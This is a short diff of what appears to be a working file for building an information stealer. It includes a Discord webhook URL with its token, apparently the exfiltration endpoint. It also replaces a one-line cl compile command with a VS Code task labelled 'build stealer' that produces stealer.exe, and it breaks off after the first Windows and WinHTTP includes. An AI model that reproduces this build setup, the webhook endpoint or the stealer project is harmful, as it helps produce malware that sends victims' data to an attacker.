@@ -1,7 +1,34 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
 
-cl stealer.cpp /EHsc /link winhttp.lib user32.lib gdi32.lib advapi32.lib
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "build stealer",
+            "type": "shell",
+            "command": "cl",
+            "args": [
+                "stealer.cpp",
+                "/EHsc",
+                "/Fe:stealer.exe"
+            ],
+            "group": {
+                "kind": "build",
+                "isDefault": true
+            },
+            "problemMatcher": "$msCompile",
+            "presentation": {
+                "echo": true,
+                "reveal": "always",
+                "focus": false,
+                "panel": "shared"
+            }
+        }
+    ]
+}
+
+
 
 #include <windows.h>
 #include <winhttp.h>
